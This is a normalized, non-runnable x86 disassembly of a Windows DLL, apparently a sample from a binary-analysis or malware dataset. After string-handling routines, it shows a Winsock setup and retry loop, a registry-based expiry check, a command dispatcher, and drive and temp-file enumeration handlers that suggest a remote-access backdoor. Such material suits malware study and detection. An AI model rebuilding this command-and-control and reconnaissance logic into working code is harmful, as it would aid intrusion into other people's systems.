mov ebp [ ebx + 0x8 ]
add ebp esi
cmp ebp 0xfffffffd
jbe r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
call sub_100106a0
test ebp ebp
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp [ ebx + 0xc ] ebp
jae r-xdata
test ecx ecx
je r-xdata
cmp al 0xff
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
push ebp
mov ecx ebx
call sub_10001f40
pop edi
mov [ ebx + 0x8 ] ebp
pop esi
mov eax ebx
pop ebp
mov [ ecx ] 0x0
pop ebx
retn 0xc
test ebp ebp
jne r-xdata
mov edx [ esp + 0x18 ]
mov edi [ ebx + 0x8 ]
mov ecx esi
lea esi [ eax + edx ]
mov eax [ ebx + 0x4 ]
add edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x8 ] ebp
mov [ ecx + ebp ] 0x0
mov eax r--data
dec al
push ebp
mov [ ecx - 0x1 ] al
mov ecx ebx
call sub_10001da0
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn 0xc
sub_10003370
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
cmp edi 0x7ffffffd
jbe r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
call sub_100106a0
test edi edi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ esi + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx esi
call sub_10003420
mov eax esi
pop edi
pop esi
retn 0x8
cmp al 0xff
je r-xdata
push 0x1
mov ecx esi
call sub_10003420
cmp eax edi
jae r-xdata
test edi edi
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] edi
mov [ eax + edi * 2 ] 0x0
mov eax esi
pop edi
pop esi
retn 0x8
push ebp
mov edx edi
mov ecx [ esp + 0xc ]
mov eax [ esi + 0x4 ]
test edi edi
jbe r-xdata
push edi
mov ecx esi
call sub_10003830
dec al
mov [ ecx - 0x1 ] al
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov eax esi
pop edi
pop esi
retn 0x8
mov bp [ ecx ]
add ecx 0x2
mov [ eax ] bp
add eax 0x2
dec edx
jne r-xdata
pop ebp
sub_10003420
mov al [ esp + 0x4 ]
push esi
test al al
mov esi ecx
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn 0x4
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_10003470
push ebx
mov ebx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
mov eax [ ebp + 0x8 ]
mov esi ecx
cmp eax ebx
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x1c ]
mov edi eax
sub edi ebx
cmp ecx edi
jae r-xdata
call sub_100108cc
cmp esi ebp
jne r-xdata
mov edi ecx
xor edx edx
cmp edi edx
jbe r-xdata
mov eax [ esi + 0x8 ]
mov ebp [ r--data ]
add edi ebx
cmp eax edi
jae r-xdata
mov ecx esi
call sub_10003820
cmp eax edi
jae r-xdata
cmp edi eax
jne r-xdata
mov ecx esi
call sub_10003940
mov eax [ esi + 0x8 ]
sub eax edi
cmp eax ebp
jae r-xdata
call sub_100108cc
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
call sub_100106a0
mov eax [ ebp + 0x4 ]
cmp eax edx
jne r-xdata
test ebp ebp
jbe r-xdata
mov ebp eax
test edi edi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
mov ecx esi
mov ebp ebx
call sub_10003940
mov eax [ esi + 0x8 ]
cmp eax ebx
jae r-xdata
mov ecx [ esi + 0x4 ]
sub eax ebp
push eax
lea eax [ edi + ebp ]
lea edx [ ecx + eax * 2 ]
lea eax [ ecx + edi * 2 ]
push edx
push eax
call sub_10003680
mov edi [ esi + 0x8 ]
add esp 0xc
sub edi ebp
mov ecx esi
push 0x0
push edi
call sub_100036f0
test al al
je r-xdata
mov eax [ esi + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx esi
call sub_10003420
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
cmp al 0xff
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx edx
je r-xdata
test ebp ebp
jbe r-xdata
mov ebp eax
mov ecx [ esi + 0x4 ]
mov [ esi + 0x8 ] edi
mov [ ecx + edi * 2 ] 0x0
push 0x1
mov ecx esi
call sub_10003420
cmp eax edi
jae r-xdata
test edi edi
jne r-xdata
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] edx
mov eax [ ebp + 0x4 ]
cmp eax edx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
mov ecx [ esi + 0x4 ]
sub eax ebp
push eax
lea edx [ ecx + ebp * 2 ]
push edx
push ecx
call sub_10003680
mov edi [ esi + 0x8 ]
add esp 0xc
sub edi ebp
mov ecx esi
push 0x0
push edi
call sub_100036f0
test al al
je r-xdata
lea ecx [ eax + ebx * 2 ]
mov eax [ esi + 0x4 ]
test edi edi
jbe r-xdata
mov eax r--data
mov eax [ ebp + 0x4 ]
test eax eax
jne r-xdata
push edi
mov ecx esi
call sub_10003830
dec al
push edi
mov [ ecx - 0x1 ] al
mov ecx esi
call sub_10003420
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
mov [ esi + 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x8 ] ecx
mov edx [ ebp + 0xc ]
mov [ esi + 0xc ] edx
mov cl [ eax - 0x1 ]
inc cl
pop edi
mov [ eax - 0x1 ] cl
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax r--data
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
xor edx edx
cmp al 0xff
je r-xdata
push edi
mov ecx esi
call sub_100036d0
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] edi
mov [ eax + edi * 2 ] 0x0
mov edx edi
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov bx [ ecx ]
add ecx 0x2
mov [ eax ] bx
add eax 0x2
dec edx
jne r-xdata
sub_10003680
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
cmp ecx eax
push edi
mov edx eax
jae r-xdata
test esi esi
jbe r-xdata
lea edi [ ecx + esi * 2 ]
cmp eax edi
jae r-xdata
pop edi
pop esi
retn
mov di [ ecx ]
add ecx 0x2
mov [ edx ] di
add edx 0x2
dec esi
jne r-xdata
test esi esi
lea edx [ eax + esi * 2 ]
mov ecx edi
jbe r-xdata
mov di [ ecx - 0x2 ]
sub ecx 0x2
sub edx 0x2
dec esi
mov [ edx ] di
jne r-xdata
pop edi
pop esi
retn
sub_100036f0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp edi 0x7ffffffd
mov esi ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
xor ebx ebx
cmp eax ebx
je r-xdata
call sub_100106a0
mov cl [ esp + 0x14 ]
cmp edi ebx
jne r-xdata
mov cl [ eax - 0x1 ]
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl 0xff
je r-xdata
cmp [ esi + 0xc ] edi
jae r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0x1f
ja r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
push edi
mov ecx esi
call sub_10003830
cmp eax ebx
je r-xdata
cmp ecx edi
jae r-xdata
pop edi
pop esi
xor al al
pop ebx
retn 0x8
mov [ esi + 0x8 ] ebx
mov [ eax ] bx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop edi
pop esi
xor al al
pop ebx
retn 0x8
mov cl [ eax - 0x1 ]
cmp cl bl
je r-xdata
dec cl
pop edi
mov [ eax - 0x1 ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
push edi
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_10003830
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
mov cl [ eax - 0x1 ]
cmp cl bl
je r-xdata
add eax 0xfffffffe
push eax
call sub_10014331
add esp 0x4
cmp cl 0xff
je r-xdata
add eax 0xfffffffe
push eax
call sub_10014331
add esp 0x4
cmp cl 0xff
je r-xdata
dec cl
pop edi
mov [ eax - 0x1 ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
dec cl
push edi
mov [ eax - 0x1 ] cl
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_10003830
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
sub_10003830
push ebp
mov ebp esp
push 0xffffffff
push sub_1001a1d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi eax
mov esi ecx
or edi 0x1f
mov [ ebp - 0x10 ] esp
cmp edi 0x7ffffffd
mov [ ebp - 0x14 ] esi
jbe r-xdata
lea eax [ edi + 0x2 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
jge r-xdata
mov edi eax
add eax eax
push eax
call sub_10014308
add esp 0x4
mov [ ebp + 0x8 ] eax
jmp r-xdata
xor eax eax
mov edx [ esi + 0x8 ]
test edx edx
jbe r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx edi
jbe r-xdata
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x8 ] 0x0
cmp ebx edi
lea eax [ ecx + 0x2 ]
mov [ esi + 0x4 ] eax
mov [ eax - 0x1 ] 0x0
mov [ esi + 0xc ] edi
ja r-xdata
mov cl [ eax - 0x1 ]
test cl cl
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
add eax 0x2
test edx edx
jbe r-xdata
mov edx edi
mov edx [ esi + 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x8 ] edi
mov [ edx + edi * 2 ] 0x0
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi ebx
add eax 0xfffffffe
push eax
call sub_10014331
add esp 0x4
cmp cl 0xff
je r-xdata
mov bx [ ecx ]
add ecx 0x2
mov [ eax ] bx
add eax 0x2
dec edx
jne r-xdata
dec cl
mov [ eax - 0x1 ] cl
jmp r-xdata
sub_10003888
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
add eax 0x2
test eax eax
jge r-xdata
lea ecx [ eax + eax ]
push ecx
call sub_10014308
mov [ ebp + 0x8 ] eax
add esp 0x4
mov eax r-xdata
retn
xor eax eax
sub_10003940
push ebp
push esi
mov esi ecx
push edi
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp al 0xff
je r-xdata
mov ebp ecx
dec al
mov [ ecx - 0x1 ] al
push ebp
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
call sub_10007b94
mov edi eax
add esp 0x4
cmp edi 0x7ffffffd
jbe r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
call sub_100106a0
test edi edi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ esi + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx esi
call sub_10003420
pop edi
pop esi
pop ebp
retn
cmp al 0xff
je r-xdata
push 0x1
mov ecx esi
call sub_10003420
cmp eax edi
jae r-xdata
test edi edi
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] edi
mov [ eax + edi * 2 ] 0x0
mov edx edi
mov eax [ esi + 0x4 ]
mov ecx ebp
test edi edi
jbe r-xdata
push edi
mov ecx esi
call sub_10003830
dec al
push edi
mov [ ecx - 0x1 ] al
mov ecx esi
call sub_10003420
pop edi
pop esi
pop ebp
retn
mov bp [ ecx ]
add ecx 0x2
mov [ eax ] bp
add eax 0x2
dec edx
jne r-xdata
sub_10003a50
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_1001a1eb
push eax
mov [ fs : 0x0 ] esp
sub esp 0x290
push ebp
push esi
push edi
mov esi 0x1
call sub_10003b20
test eax eax
jne r-xdata
mov edi [ Sleep@IAT ]
or ebp 0xffffffff
mov ecx [ esp + 0x29c ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x29c
retn
call sub_10003b90
test eax eax
je r-xdata
call eax
lea ecx [ esp + 0xc ]
call sub_10005120
push rw-data
push rw-data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2ac ] 0x0
call sub_100051f0
test al al
jne r-xdata
push 0xea60
call edi
call sub_10003b90
test eax eax
jne r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0x2a4 ] ebp
call sub_10005190
jmp r-xdata
lea eax [ esi + esi * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x4
push eax
call edi
cmp esi 0x400
jae r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
add esi esi
sub_10003b20
sub esp 0x190
push rw-data
call [ LoadLibraryA@IAT ]
test eax eax
je r-xdata
lea eax [ esp ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
xor eax eax
add esp 0x190
retn
mov ax [ esp ]
cmp al 0x2
jne r-xdata
call [ WSACleanup@IAT ]
xor ecx ecx
mov cl ah
cmp cl al
jne r-xdata
mov eax 0x1
add esp 0x190
retn
sub_10003b90
sub esp 0x2c
lea eax [ esp + 0x1c ]
push eax
call [ GetSystemTime@IAT ]
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push ecx
push edx
call [ SystemTimeToFileTime@IAT ]
test eax eax
jne r-xdata
lea eax [ esp ]
mov [ esp + 0x4 ] 0x4
push eax
push 0x1
push 0x0
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
add esp 0x2c
retn
lea ecx [ esp + 0x4 ]
push esi
mov esi [ RegQueryValueExA@IAT ]
lea edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
push edx
push eax
push 0x0
push rw-data
push ecx
call esi
test eax eax
je r-xdata
xor eax eax
add esp 0x2c
retn
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x14 ]
push eax
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push 0x0
push rw-data
push eax
call esi
test eax eax
pop esi
je r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x10 ] edx
mov edx [ esp ]
push edx
call [ RegCloseKey@IAT ]
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
call [ CompareFileTime@IAT ]
xor edx edx
cmp eax 0xffffffff
sete dl
mov eax edx
add esp 0x2c
retn
mov ecx [ esp + 0x18 ]
mov [ esp + 0x10 ] ecx
sub_10003ca0
push 0xffffffff
push sub_1001a208
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_10002160
xor eax eax
push 0x200064
mov [ esp + 0x14 ] eax
mov [ esi ] r--data
mov [ esi + 0x80 ] eax
mov [ esi + 0x84 ] eax
call sub_10014308
mov ecx [ esp + 0xc ]
add esp 0x4
mov [ esi + 0x7c ] eax
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_10003d30
mov eax [ esp + 0x8 ]
sub esp 0x84
push ebx
mov ebx [ esp + 0x94 ]
push ebp
push esi
push edi
mov esi ecx
mov ecx [ esp + 0x98 ]
push 0xfa1
push ebx
push eax
push ecx
mov ecx esi
call sub_100028b0
test al al
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn 0xc
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] 0x0
[ edi ]
stosw [ edi ]
lea edx [ esp + 0x14 ]
lea ecx [ esi + 0x70 ]
push edx
mov [ esp + 0x14 ] 0x0
stosb [ edi ]
call sub_10001840
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push eax
push 0x80
push ecx
mov ecx esi
call sub_10002dc0
test al al
je r-xdata
mov ecx esi
call sub_10002cf0
test al al
je r-xdata
lea edi [ esi + 0x80 ]
lea ebp [ esi + 0x84 ]
mov eax [ esi + 0x7c ]
mov ecx [ ebp ]
mov [ eax + ecx ] 0x0
mov eax [ edi ]
add eax 0xffffec74
cmp eax 0x16
ja r-xdata
mov [ ebp ] 0x0
mov [ edi ] 0x1b5a
xor edx edx
mov dl [ eax + lookup_table_10003ea8 ]
jmp [ edx * 4 + jump_table_10003e90 ]
mov edx [ esi + 0x7c ]
push edi
push ebp
push edx
mov ecx esi
call sub_10003ec0
test eax eax
je r-xdata
mov eax [ esi + 0x7c ]
push edi
push ebp
push eax
mov ecx esi
call sub_10004250
jmp r-xdata
mov ecx [ esi + 0x7c ]
push edi
push ebp
push ecx
mov ecx esi
call sub_10004090
jmp r-xdata
mov edx [ esi + 0x7c ]
push edi
push ebp
push edx
mov ecx esi
call sub_10004f60
jmp r-xdata
mov eax [ esp + 0x9c ]
mov ecx [ esi + 0x7c ]
push ebx
push eax
push edi
push ebp
push ecx
mov ecx esi
call sub_10004680
jmp r-xdata
mov edx [ esp + 0x9c ]
mov eax [ esi + 0x7c ]
push ebx
push edx
push edi
push ebp
push eax
mov ecx esi
call sub_10004ad0
jmp r-xdata
mov ecx [ esi + 0x7c ]
push edi
push ebp
push ecx
mov ecx esi
call sub_10003f20
test eax eax
jne r-xdata
sub_10003ec0
mov eax [ esp + 0xc ]
push esi
push edi
push 0x4
mov esi ecx
push eax
call sub_10002d20
test al al
jne r-xdata
mov edi [ esp + 0x10 ]
push 0x4
push edi
mov ecx esi
call sub_10002d20
test al al
jne r-xdata
pop edi
xor eax eax
pop esi
retn 0xc
mov eax [ edi ]
test eax eax
ja r-xdata
pop edi
xor eax eax
pop esi
retn 0xc
mov ecx [ esp + 0xc ]
push eax
push ecx
mov ecx esi
call sub_10002d20
neg al
sbb eax eax
pop edi
neg eax
pop esi
retn 0xc
pop edi
mov eax 0x1
pop esi
retn 0xc
sub_10003f20
push esi
push edi
mov esi ecx
call sub_10002cc0
test al al
jne r-xdata
mov eax [ esp + 0x14 ]
push 0x4
push eax
mov ecx esi
call sub_10002d80
test al al
jne r-xdata
pop edi
xor eax eax
pop esi
retn 0xc
mov edi [ esp + 0x10 ]
push 0x4
push edi
mov ecx esi
call sub_10002d80
test al al
jne r-xdata
pop edi
xor eax eax
pop esi
retn 0xc
mov ecx [ edi ]
push ecx
push rw-data
call sub_1000775f
mov edi [ edi ]
add esp 0x8
test edi edi
jbe r-xdata
pop edi
xor eax eax
pop esi
retn 0xc
mov ecx esi
call sub_10002cf0
neg al
sbb eax eax
pop edi
neg eax
pop esi
retn 0xc
mov edx [ esp + 0xc ]
push edi
push edx
mov ecx esi
call sub_10002d80
test al al
jne r-xdata
pop edi
xor eax eax
pop esi
retn 0xc
sub_10003fb0
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov ebx [ eax ]
push edi
push ebx
call sub_10014308
mov edx [ esp + 0x18 ]
mov ecx ebx
mov ebp eax
mov eax ecx
mov esi edx
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x1c ]
push ebx
and ecx 0x3
push ebp
push eax
[ edi ] [ esi ]
push edx
mov [ eax ] 0x200000
call sub_10010ae0
push ebp
call sub_10014331
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_10004000
push esi
mov esi [ esp + 0x14 ]
push edi
mov ecx esi
mov eax [ esi ]
call [ eax + 0x30 ]
mov edi eax
test edi edi
jne r-xdata
push ebx
push edi
call sub_10014308
mov edx [ esi ]
add esp 0x4
mov ecx esi
mov ebx eax
push 0x0
push 0x0
call [ edx + 0x28 ]
mov eax [ esi ]
push edi
push ebx
mov ecx esi
call [ eax + 0x34 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x4c ]
mov eax [ esp + 0x14 ]
push edi
push ebx
push eax
mov [ eax ] 0x200000
mov eax [ esp + 0x1c ]
push eax
call sub_10010ae0
mov ecx [ esp + 0x28 ]
push ebx
mov [ ecx ] 0x0
call sub_10014331
add esp 0x14
pop ebx
pop edi
pop esi
retn 0x10
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ ecx ] eax
mov [ edx ] eax
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4c ]
pop edi
pop esi
retn 0x10
sub_10004090
sub esp 0x220
push ebx
mov [ esp + 0x20 ] ecx
push edi
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x28 ]
[ edi ]
lea eax [ esp + 0x28 ]
push eax
push 0x68
call [ GetLogicalDriveStringsA@IAT ]
xor ebx ebx
mov [ esp + 0x8 ] eax
test eax eax
jbe r-xdata
shr eax 0x2
mov ecx eax
mov edx [ esp + 0x234 ]
shl eax 0x5
add eax ecx
lea ecx [ eax + eax * 8 ]
mov eax [ esp + 0x230 ]
push eax
mov [ eax ] ecx
mov eax [ esp + 0x230 ]
mov ecx [ esp + 0x28 ]
push eax
mov [ edx ] 0x0
call sub_10003fb0
pop edi
pop ebx
add esp 0x220
retn 0xc
mov ecx [ esp + 0x22c ]
push ebp
push esi
lea ebp [ ecx + 0x5 ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebp + 0xfb ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp + 0x110 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp al 0x42
je r-xdata
lea esi [ ebp - 0x5 ]
mov ecx 0x4a
xor eax eax
mov edi esi
[ edi ]
stosb [ edi ]
lea edi [ esp + ebx + 0x30 ]
push edi
push rw-data
push esi
call sub_100076ea
push esi
call sub_100075b6
add esp 0x10
mov [ ebp + 0x2 ] 0x0
push edi
call [ GetDriveTypeA@IAT ]
mov [ ebp + 0x10f ] al
mov al [ ebp ]
cmp al 0x41
je r-xdata
pop esi
pop ebp
xor edx edx
lea eax [ esp + 0x24 ]
mov [ esp + 0x18 ] edx
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1c ] edx
push eax
mov [ esp + 0x24 ] edx
push ecx
mov [ esp + 0x2c ] edx
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x30 ] edx
lea edx [ esp + 0x1c ]
push edx
push edi
call [ GetDiskFreeSpaceExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
mov ecx 0x14
call sub_10007740
push edx
push eax
lea eax [ ebp + 0xfb ]
push rw-data
push eax
call sub_100076ea
mov eax [ esp + 0x34 ]
mov edx [ esp + 0x38 ]
add esp 0x10
mov ecx 0x14
call sub_10007740
push edx
push eax
lea ecx [ ebp + 0x110 ]
push rw-data
push ecx
call sub_100076ea
add esp 0x10
jmp r-xdata
mov eax [ esp + 0x10 ]
add ebx 0x4
add ebp 0x129
cmp ebx eax
jb r-xdata
sub_10004250
push 0xffffffff
push sub_1001a236
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x568
push ebx
mov [ esp + 0x3c ] ecx
push esi
push edi
lea ecx [ esp + 0x14 ]
call sub_10006570
xor ebx ebx
mov ecx 0x7f
xor eax eax
lea edi [ esp + 0x375 ]
mov [ esp + 0x374 ] bl
mov [ esp + 0x48 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x49 ]
mov [ esp + 0x57c ] ebx
[ edi ]
mov eax [ esp + 0x588 ]
mov ecx [ esp + 0x584 ]
mov edx [ eax ]
mov [ edx + ecx ] bl
mov eax [ eax ]
lea eax [ eax + ecx - 0x1 ]
cmp [ eax ] 0x5c
jne r-xdata
mov ecx 0x7f
xor eax eax
lea edi [ esp + 0x175 ]
mov [ esp + 0x174 ] bl
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x174 ]
push ecx
push 0x1f4
stosb [ edi ]
call [ GetTempPathA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x174 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x30 ]
call sub_1001433c
push ebx
lea eax [ esp + 0x178 ]
push 0x1002
push eax
lea ecx [ esp + 0x3c ]
mov [ esp + 0x588 ] 0x1
call sub_1001444e
test eax eax
jne r-xdata
mov [ eax ] bl
mov eax [ esp + 0x584 ]
lea ecx [ esp + 0x374 ]
push eax
push rw-data
push ecx
call sub_100076ea
add esp 0xc
lea edx [ esp + 0x374 ]
lea ecx [ esp + 0x14 ]
push ebx
push edx
call sub_10006633
test eax eax
jne r-xdata
mov ecx [ esp + 0x588 ]
mov edx [ esp + 0x58c ]
mov [ ecx ] ebx
mov [ edx ] 0x1b59
jmp r-xdata
lea ecx [ esp + 0x14 ]
call sub_10006853
test eax eax
lea ecx [ esp + 0x14 ]
je r-xdata
lea ecx [ esp + 0x14 ]
call sub_100065e9
lea ecx [ esp + 0x30 ]
call sub_10014669
mov eax [ esp + 0x588 ]
mov ecx [ esp + 0x58c ]
mov [ eax ] ebx
mov [ ecx ] 0x1b59
jmp r-xdata
lea ecx [ esp + 0x30 ]
mov [ esp + 0x57c ] bl
call sub_10014391
lea ecx [ esp + 0x14 ]
mov [ esp + 0x57c ] 0xffffffff
call sub_100065ad
mov ecx [ esp + 0x574 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x574
retn 0xc
call sub_1000681a
test eax eax
jne r-xdata
call sub_1000681a
test eax eax
jne r-xdata
lea ecx [ esp + 0x14 ]
call sub_100065e9
mov eax [ esp + 0x58c ]
mov ecx [ esp + 0x588 ]
lea edx [ esp + 0x30 ]
push edx
mov edx [ esp + 0x588 ]
push eax
push ecx
mov ecx [ esp + 0x50 ]
push edx
call sub_10004000
mov edx [ esp + 0x14 ]
push 0x10
lea ecx [ esp + 0x18 ]
call [ edx + 0x38 ]
cmp eax ebx
lea ecx [ esp + 0xc ]
sete al
add eax 0x7
push ecx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x160 ] al
call sub_10006922
mov eax [ eax ]
or ecx 0xffffffff
mov edi eax
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x48 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xc ]
call sub_10014bf1
lea ecx [ esp + 0x14 ]
call sub_10006aaa
cmp eax 0x400
lea ecx [ esp + 0x14 ]
jbe r-xdata
mov edx [ esp + 0x14 ]
push 0x10
lea ecx [ esp + 0x18 ]
call [ edx + 0x38 ]
neg eax
sbb al al
lea ecx [ esp + 0x14 ]
add eax 0x8
mov [ esp + 0x15c ] al
lea eax [ esp + 0x40 ]
push eax
call sub_10006922
mov edi [ eax ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x48 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x40 ]
call sub_10014bf1
lea ecx [ esp + 0x14 ]
call sub_10006aaa
cmp eax 0x400
lea ecx [ esp + 0x14 ]
jbe r-xdata
call sub_10006aaa
push eax
lea edx [ esp + 0x14c ]
push rw-data
push edx
call sub_10006aaa
shr eax 0xa
push eax
lea ecx [ esp + 0x14c ]
